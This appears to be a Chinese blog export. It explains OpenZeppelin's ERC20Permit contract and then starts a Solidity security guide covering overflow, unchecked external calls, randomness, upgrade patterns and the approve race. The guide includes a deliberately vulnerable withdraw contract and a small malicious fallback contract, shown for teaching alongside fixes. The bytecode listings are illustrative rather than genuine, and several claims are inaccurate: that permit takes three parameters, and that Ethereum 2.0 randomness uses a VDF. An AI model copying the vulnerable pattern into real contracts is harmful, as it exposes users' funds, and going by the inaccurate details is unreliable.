<h1 id="ERC20Permit"><a href="#ERC20Permit" class="headerlink" title="ERC20Permit"></a>ERC20Permit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/ERC20Permit.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20Permit&#125; from &quot;./IERC20Permit.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;../ERC20.sol&quot;;</span><br><span class="line">import &#123;ECDSA&#125; from &quot;../../../utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line">import &#123;EIP712&#125; from &quot;../../../utils/cryptography/EIP712.sol&quot;;</span><br><span class="line">import &#123;Nonces&#125; from &quot;../../../utils/Nonces.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @dev Implementation of the ERC-20 Permit extension allowing approvals to be made via signatures, as defined in</span><br><span class="line"> * https://eips.ethereum.org/EIPS/eip-2612[ERC-2612].</span><br><span class="line"> *</span><br><span class="line"> * Adds the &#123;permit&#125; method, which can be used to change an account&#x27;s ERC-20 allowance (see &#123;IERC20-allowance&#125;) by</span><br><span class="line"> * presenting a message signed by the account. By not relying on `&#123;IERC20-approve&#125;`, the token holder account doesn&#x27;t</span><br><span class="line"> * need to send a transaction, and thus is not required to hold Ether at all.</span><br><span class="line"> */</span><br><span class="line">abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712, Nonces &#123;</span><br><span class="line">    bytes32 private constant PERMIT_TYPEHASH =</span><br><span class="line">    keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Permit deadline has expired.</span><br><span class="line">     */</span><br><span class="line">    error ERC2612ExpiredSignature(uint256 deadline);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Mismatched signature.</span><br><span class="line">     */</span><br><span class="line">    error ERC2612InvalidSigner(address signer, address owner);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the &#123;EIP712&#125; domain separator using the `name` parameter, and setting `version` to `&quot;1&quot;`.</span><br><span class="line">     *</span><br><span class="line">     * It&#x27;s a good idea to use the same `name` that is defined as the ERC-20 token name.</span><br><span class="line">     */</span><br><span class="line">    constructor(string memory name) EIP712(name, &quot;1&quot;) &#123;&#125;</span><br><span class="line">       </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    function permit(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s</span><br><span class="line">    ) public virtual &#123;</span><br><span class="line">        if (block.timestamp &gt; deadline) &#123;</span><br><span class="line">            revert ERC2612ExpiredSignature(deadline);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));</span><br><span class="line"> </span><br><span class="line">         bytes32 hash = _hashTypedDataV4(structHash);</span><br><span class="line"> </span><br><span class="line">         address signer = ECDSA.recover(hash, v, r, s);</span><br><span class="line">         if (signer != owner) &#123;</span><br><span class="line">             revert ERC2612InvalidSigner(signer, owner);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) &#123;</span><br><span class="line">        return super.nonces(owner);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    // solhint-disable-next-line func-name-mixedcase</span><br><span class="line">    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) &#123;</span><br><span class="line">        return _domainSeparatorV4();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ERC20Permit</code> 是一个抽象合约，它结合了 ERC-20 标准和 ERC-2612 标准的功能。ERC-2612 标准允许使用签名来批准代币转移，而无需直接调用 <code>approve</code> 函数。下面是对代码的详细解释：</p>
<h3 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong>继承关系</strong>：</p>
<ul>
<li><code>ERC20Permit</code> 继承了 <code>ERC20</code>、<code>IERC20Permit</code>、<code>EIP712</code> 和 <code>Nonces</code> 四个合约。</li>
<li><code>ERC20</code> 实现了 ERC-20 标准的代币功能。</li>
<li><code>IERC20Permit</code> 定义了 ERC-2612 标准的接口。</li>
<li><code>EIP712</code> 用于生成和验证 EIP-712 签名。</li>
<li><code>Nonces</code> 用于管理每个账户的签名计数器。</li>
</ul>
</li>
<li><p><strong>常量</strong>：</p>
<ul>
<li><code>PERMIT_TYPEHASH</code> 是一个哈希值，用于在 EIP-712 签名中标识 <code>Permit</code> 结构。</li>
</ul>
</li>
<li><p><strong>错误</strong>：</p>
<ul>
<li><code>ERC2612ExpiredSignature</code>：当签名过期时抛出。</li>
<li><code>ERC2612InvalidSigner</code>：当签名者与账户不匹配时抛出。</li>
</ul>
</li>
<li><p><strong>构造函数</strong>：</p>
<ul>
<li>初始化 <code>EIP712</code> 的域分隔符，使用传入的 <code>name</code> 参数，并设置版本号为 <code>&quot;1&quot;</code>。</li>
</ul>
</li>
<li><p><strong>permit 函数</strong>：</p>
<ul>
<li>验证签名是否过期。</li>
<li>生成 <code>Permit</code> 结构的哈希值。</li>
<li>使用 EIP-712 签名验证机制恢复签名者地址。</li>
<li>检查签名者是否与 <code>owner</code> 匹配。</li>
<li>调用 <code>_approve</code> 函数批准代币转移。</li>
</ul>
</li>
<li><p><strong>nonces 函数</strong>：</p>
<ul>
<li>返回指定账户的签名计数器值。</li>
</ul>
</li>
<li><p><strong>DOMAIN_SEPARATOR 函数</strong>：</p>
<ul>
<li>返回 EIP-712 的域分隔符。</li>
</ul>
</li>
</ol>
<h3 id="用途-3"><a href="#用途-3" class="headerlink" title="用途"></a>用途</h3><p><code>ERC20Permit</code> 合约允许用户通过签名来批准代币转移，而无需直接调用 <code>approve</code> 函数。这对于提高安全性（避免重放攻击）和用户体验（无需每次都手动批准）非常有用。</p>
<h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><strong>安全性</strong>：确保正确实现 EIP-712 签名验证，以防止签名被滥用。</li>
<li><strong>时间戳</strong>：使用 <code>block.timestamp</code> 来检查签名是否过期，确保安全性。</li>
<li><strong>nonce</strong>：使用 <code>nonce</code> 来防止重放攻击，确保每个签名只被使用一次。</li>
<li><strong>兼容性</strong>：确保合约与所有相关接口和标准兼容，以避免潜在的问题。</li>
</ol>
<h3 id="ERC-2612标准"><a href="#ERC-2612标准" class="headerlink" title="ERC-2612标准"></a>ERC-2612标准</h3><p>ERC-2612 标准提供了一种安全、高效的方式来授权代币转移，是 ERC-20 标准的一个扩展。它允许代币持有者通过签名授权第三方转移代币，而不需要直接调用 <code>approve</code> 函数。这个标准基于 EIP-712，它提供了一种使用签名来验证和执行操作的方法。</p>
<h4 id="ERC-2612-标准的主要功能"><a href="#ERC-2612-标准的主要功能" class="headerlink" title="ERC-2612 标准的主要功能"></a>ERC-2612 标准的主要功能</h4><ol>
<li><p><strong>Permit 函数</strong>：允许代币持有者通过签名授权第三方转移代币。这个函数需要三个参数：<code>owner</code>（代币持有者的地址）、<code>spender</code>（被授权的地址）和 <code>value</code>（被授权的代币数量）。</p>
</li>
<li><p><strong>EIP-712 签名</strong>：使用 EIP-712 签名来验证 <code>Permit</code> 函数的调用。EIP-712 是一种用于生成和验证签名的标准，它允许在签名中包含额外的元数据，如链 ID 和域分隔符。</p>
</li>
<li><p><strong>Nonce</strong>：每个账户都有一个关联的 <code>nonce</code> 值，用于防止重放攻击。在 <code>Permit</code> 函数中，<code>nonce</code> 值会自动增加，确保每个签名只被使用一次。</p>
</li>
</ol>
<h4 id="ERC-2612-标准的实现"><a href="#ERC-2612-标准的实现" class="headerlink" title="ERC-2612 标准的实现"></a>ERC-2612 标准的实现</h4><p>要实现 ERC-2612 标准，代币合约需要包含以下部分：</p>
<ol>
<li><p><strong>Permit 函数</strong>：实现 <code>Permit</code> 函数，用于处理签名授权。</p>
</li>
<li><p><strong>EIP-712 签名</strong>：实现 EIP-712 签名生成和验证机制。</p>
</li>
<li><p><strong>Nonce</strong>：管理每个账户的 <code>nonce</code> 值。</p>
</li>
<li><p><strong>DOMAIN_SEPARATOR</strong>：生成 EIP-712 签名的域分隔符。</p>
</li>
</ol>
<h4 id="ERC-2612-标准的用途"><a href="#ERC-2612-标准的用途" class="headerlink" title="ERC-2612 标准的用途"></a>ERC-2612 标准的用途</h4><p>ERC-2612 标准的主要用途是提高代币的安全性。通过使用签名来授权代币转移，可以防止重放攻击，并简化用户界面。此外，它还可以提高交易效率，因为用户不需要每次都手动批准代币转移。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
        <tag>openzeppelin</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity编程安全</title>
    <url>/2024/11/28/blockchain/ethereum/solidity-security/</url>
    <content><![CDATA[<p>在编写 Solidity 智能合约时，安全性是最重要的考虑因素之一。以下是开发中常见的安全问题及其解决方法：</p>
<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p><a href="https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</a></p>
<h1 id="溢出与下溢（Overflow-and-Underflow）"><a href="#溢出与下溢（Overflow-and-Underflow）" class="headerlink" title="溢出与下溢（Overflow and Underflow）"></a>溢出与下溢（Overflow and Underflow）</h1><p><strong>溢出（Overflow）和下溢（Underflow）</strong>是指在处理整数运算时，当结果超出数据类型表示范围时，值会“环绕”到另一端。例如，对于 uint8 类型：</p>
<ul>
<li>溢出： uint8 的最大值是 255，如果执行 255 + 1，值会变为 0。</li>
<li>下溢： uint8 的最小值是 0，如果执行 0 - 1，值会变为 255。</li>
</ul>
<p>在早期的 Solidity 版本中，这种现象常导致严重漏洞，攻击者可以利用这种行为达到意想不到的目的。自 Solidity 0.8 开始，溢出和下溢会触发异常，但了解它们的历史以及如何防范仍然很重要。虽然Solidity 0.8开始增加了溢出检查，这也会导致Gas费用的增加。</p>
<p>在 Solidity 0.8+ 中，每次整数加减运算都会隐式包含溢出检查逻辑，而这种检查需要额外的操作指令，因此会增加运行时消耗的 gas。</p>
<p><strong>Solidity 0.8+</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract OverflowCheck &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) public pure returns (uint256) &#123;</span><br><span class="line">        return a + b; // 含溢出检查</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00    PUSH1  0x60</span><br><span class="line">0x02    MSTORE</span><br><span class="line">0x03    CALLDATALOAD</span><br><span class="line">0x04    CALLDATALOAD</span><br><span class="line">0x05    ADD         // 加法</span><br><span class="line">0x06    JUMPI       // 检查溢出</span><br><span class="line">0x07    REVERT      // 如果溢出，回滚</span><br><span class="line">0x08    RETURN</span><br></pre></td></tr></table></figure>

<p><strong>Solidity 0.7</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract NoOverflowCheck &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) public pure returns (uint256) &#123;</span><br><span class="line">        return a + b; // 无溢出检查</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00    PUSH1  0x60</span><br><span class="line">0x02    MSTORE</span><br><span class="line">0x03    CALLDATALOAD</span><br><span class="line">0x04    CALLDATALOAD</span><br><span class="line">0x05    ADD         // 直接加法</span><br><span class="line">0x06    RETURN</span><br></pre></td></tr></table></figure>

<ol>
<li>Solidity 0.8 的溢出检查增加了 ~50 gas 的开销。</li>
<li>增加的开销源于额外的汇编指令（JUMPI 和 REVERT）。</li>
<li>如果对 gas 成本敏感，可以使用 unchecked 块绕过检查，但需确保逻辑安全。</li>
</ol>
<h1 id="未检查的外部调用（Unchecked-External-Call）"><a href="#未检查的外部调用（Unchecked-External-Call）" class="headerlink" title="未检查的外部调用（Unchecked External Call）"></a>未检查的外部调用（Unchecked External Call）</h1><p>“未检查的外部调用”漏洞（Unchecked External Call）是 Solidity 智能合约中的一种常见安全问题。如果智能合约与外部地址交互（比如转账或调用另一个合约的函数）时未检查调用的结果，可能会引发意外的后果和漏洞利用。</p>
<h2 id="潜在问题"><a href="#潜在问题" class="headerlink" title="潜在问题"></a>潜在问题</h2><ol>
<li>失败的调用未被检测<br> 如果调用失败但未进行检查，合约可能会继续执行后续逻辑，从而导致不一致状态或意外行为。<br> 示例问题：转账操作失败，但余额已经从发送方扣除。</li>
<li>错误处理被忽略<br> 外部合约调用可能由于异常（例如合约不存在或代码逻辑错误）而失败。如果不检查返回值，调用方将无法正确处理这些失败。</li>
<li>逻辑漏洞导致资金损失<br> 如果未检查调用结果的返回值，攻击者可以通过故意设计失败的合约逻辑，扰乱调用方合约的资金或状态管理。</li>
<li>影响合约的可组合性<br> 在 DeFi 等应用场景中，不同合约之间通常会进行复杂交互。如果未正确检查外部调用的结果，会影响合约间的协作，甚至破坏整个生态系统的安全性。</li>
</ol>
<p><strong>漏洞示例代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract UncheckedExternalCall &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款功能</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提现功能，发送资金给用户</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 发送资金，但未检查返回值</span><br><span class="line">        payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>恶意示例代码</strong><br>攻击者可以部署一个恶意合约，故意使 call 失败（例如，使用耗尽 gas 的回退函数），从而导致 balances 状态不一致。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Malicious &#123;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">    // 消耗所有 gas，故意让调用失败</span><br><span class="line">        while (true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>显式检查 call 返回的布尔值，以确保调用成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">    // 检查调用结果</span><br><span class="line">    (bool success, ) = payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="随机数生成不安全"><a href="#随机数生成不安全" class="headerlink" title="随机数生成不安全"></a>随机数生成不安全</h1><h2 id="为什么Solidity-中随机数生成不安全？"><a href="#为什么Solidity-中随机数生成不安全？" class="headerlink" title="为什么Solidity 中随机数生成不安全？"></a>为什么Solidity 中随机数生成不安全？</h2><p>在 Solidity 中，常见的随机数生成方式（如依赖区块哈希、时间戳等）容易被攻击者预测或操控：</p>
<ol>
<li>区块哈希依赖（blockhash）： 区块哈希是公开信息，矿工可以选择不挖某些区块，进而影响生成的随机数。</li>
<li>时间戳依赖（block.timestamp）： 矿工可以小幅调整时间戳，使得随机数变为对其有利的值。</li>
<li>合约状态依赖（msg.sender, block.difficulty 等）： 合约状态和交易上下文的信息可以被预测和操控。</li>
</ol>
<p>这些方式在确定性（公开信息和上下文）和可操控性（矿工或攻击者干预）方面不安全。</p>
<h2 id="如何安全生成随机数？"><a href="#如何安全生成随机数？" class="headerlink" title="如何安全生成随机数？"></a>如何安全生成随机数？</h2><ol>
<li>Chainlink VRF:<ul>
<li>可证明公平且可验证的随机数生成器（RNG），它使智能合约能够在不影响安全性或可用性的情况下访问随机值。</li>
<li>建立区块链游戏和NFT</li>
<li>随机分配职责和资源。例如，随机分配法官到案件。</li>
<li>为共识机制选择一个具有代表性的样本。<br> 用法：<a href="https://docs.chain.link/vrf/v2-5/getting-started">https://docs.chain.link/vrf/v2-5/getting-started</a></li>
</ul>
</li>
<li>Off-chain Randomness (链下随机数)：<ul>
<li>使用链下生成随机数（如通过服务器或 API），然后将结果提交到链上。</li>
<li>缺点：需要信任链下服务，可能会被操控。</li>
<li>改进：通过多方签名或可信执行环境（如 Intel SGX）生成。</li>
</ul>
</li>
<li>Threshold Signature Schemes (TSS)：<ul>
<li>多方合作生成随机数，每方只持有部分秘密信息。</li>
<li>优势：随机数完全由多方参与生成，无法单点操控。</li>
<li>使用场景：像 Chainlink 的去中心化预言机网络。</li>
</ul>
</li>
<li>VDF（Verifiable Delay Function）：<ul>
<li>一种不可预测的随机数生成方式，需要一定时间来计算结果。</li>
<li>优势：矿工无法提前操控随机数。</li>
<li>实现：Ethereum 2.0 的随机数生成设计中引入了 VDF。</li>
</ul>
</li>
</ol>
<h1 id="智能合约升级问题"><a href="#智能合约升级问题" class="headerlink" title="智能合约升级问题"></a>智能合约升级问题</h1><p>智能合约在部署后通常无法直接修改，这可能导致升级和维护困难。如果设计不当，可能需要完全重启项目，从而浪费资源并导致用户信任危机。</p>
<h2 id="解决方案-1：代理合约（Proxy-Pattern）"><a href="#解决方案-1：代理合约（Proxy-Pattern）" class="headerlink" title="解决方案 1：代理合约（Proxy Pattern）"></a>解决方案 1：代理合约（Proxy Pattern）</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>通过代理模式将合约分为两部分：</p>
<ol>
<li>代理合约（Proxy）： 存储状态变量，负责将用户请求委托给逻辑合约。</li>
<li>逻辑合约（Logic&#x2F;Implementation）： 包含实际的业务逻辑，可以升级和替换。</li>
</ol>
<p>用户总是与代理合约交互，代理通过 delegatecall 将调用转发到逻辑合约，使用代理合约的存储保持状态一致。</p>
<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><ol>
<li>UUPS Proxy<ul>
<li>使用 upgradeTo 方法直接升级逻辑合约。</li>
<li>更加轻量，但需要实现升级逻辑。</li>
</ul>
</li>
<li>Transparent Proxy<ul>
<li>避免管理员调用代理时出现冲突。</li>
<li>管理员可升级逻辑合约，用户调用时自动转发。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Proxy &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _implementation) &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool success, ) = implementation.delegatecall(msg.data);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgrade(address newImplementation) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can upgrade&quot;);</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getData(uint256 _num) public pure returns (bytes memory) &#123;</span><br><span class="line">        return abi.encodeWithSignature(&quot;setNumber(uint256)&quot;, _num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number * 2; // Updated logic</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>无需重新部署存储状态，升级逻辑灵活。</li>
<li>用户无感知升级操作。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>增加代码复杂度。</li>
</ul>
<h2 id="解决方案2：模块化合约（Modular-Contract）"><a href="#解决方案2：模块化合约（Modular-Contract）" class="headerlink" title="解决方案2：模块化合约（Modular Contract）"></a>解决方案2：模块化合约（Modular Contract）</h2><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><p>将合约分解为多个独立模块，所有模块通过核心合约（Registry 或 Router）进行管理。每个模块可单独替换而不影响整体功能。</p>
<h3 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ILOGIC &#123;</span><br><span class="line">    function setNumber(uint256 _number) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Router &#123;</span><br><span class="line">    mapping(string =&gt; address) public modules;</span><br><span class="line">    address public admin;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function updateModule(string memory moduleName, address moduleAddress) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can update&quot;);</span><br><span class="line">        modules[moduleName] = moduleAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setNumber(string memory moduleName, uint256 _num) external &#123;</span><br><span class="line">        address module = modules[moduleName];</span><br><span class="line">        require(module != address(0), &quot;Module not found&quot;);</span><br><span class="line">        ILOGIC(module).setNumber(_num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 is ILOGIC &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public  &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 is ILOGIC &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number * 2; // Updated logic</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>便于扩展新功能或模块。</li>
<li>每个模块的更新不会影响其他部分。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>初始设计复杂度较高。</li>
<li>需要额外存储模块地址。</li>
</ul>
<h2 id="解决方案-3：数据分离（Storage-Contract）"><a href="#解决方案-3：数据分离（Storage-Contract）" class="headerlink" title="解决方案 3：数据分离（Storage Contract）"></a>解决方案 3：数据分离（Storage Contract）</h2><h3 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h3><p>将状态数据和业务逻辑分离为两个独立合约：</p>
<ol>
<li>存储合约（Storage Contract）： 负责存储状态变量。</li>
<li>逻辑合约（Logic Contract）： 包含具体逻辑，可单独升级。</li>
</ol>
<h3 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h3><p><em>在上一个实现示例的基础上，进行存储合约和逻辑合约的分离。</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ISTORE &#123;</span><br><span class="line">    function setNumber(uint256 _number) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Store is ISTORE &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    function setNumber(uint256 _number) external &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ILOGIC &#123;</span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Router &#123;</span><br><span class="line">    mapping(string =&gt; address) public modules;</span><br><span class="line">    address public admin;</span><br><span class="line">    ISTORE public store;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        store = new Store();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function updateModule(string memory moduleName, address moduleAddress) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can update&quot;);</span><br><span class="line">        modules[moduleName] = moduleAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setNumber(string memory moduleName, uint256 _num) external &#123;</span><br><span class="line">        address module = modules[moduleName];</span><br><span class="line">        require(module != address(0), &quot;Module not found&quot;);</span><br><span class="line">        ILOGIC(module).setNumber(_num, store);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 &#123;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) public  &#123;</span><br><span class="line">        store.setNumber(_number);</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 is ILOGIC &#123;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) public  &#123;</span><br><span class="line">        store.setNumber(_number * 2);</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>清晰的数据和逻辑分离。</li>
<li>升级逻辑时不会影响存储。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>初次部署复杂。</li>
<li>存储和逻辑合约间的交互增加调用成本。</li>
</ul>
<h1 id="ERC20中“approve”无限授权的问题"><a href="#ERC20中“approve”无限授权的问题" class="headerlink" title="ERC20中“approve”无限授权的问题"></a>ERC20中“approve”无限授权的问题</h1><h2 id="竞争环境"><a href="#竞争环境" class="headerlink" title="竞争环境"></a>竞争环境</h2><h3 id="ERC20-的授权与竞争"><a href="#ERC20-的授权与竞争" class="headerlink" title="ERC20 的授权与竞争"></a>ERC20 的授权与竞争</h3><p><strong>假设场景</strong></p>
<p>假设有一个用户 Alice 和一个智能合约 Token，以及一个攻击者 Mallory。Alice 想通过 approve 函数授权 Mallory 代她消费代币。</p>
<p>初始状态：</p>
<p>Alice 的账户余额为 1000 个 Token。<br>Mallory 尚未获得任何授权。<br>Token 合约中的 approve 函数允许 Alice 授权 Mallory一定额度的代币。<br>Alice 执行以下两个交易：</p>
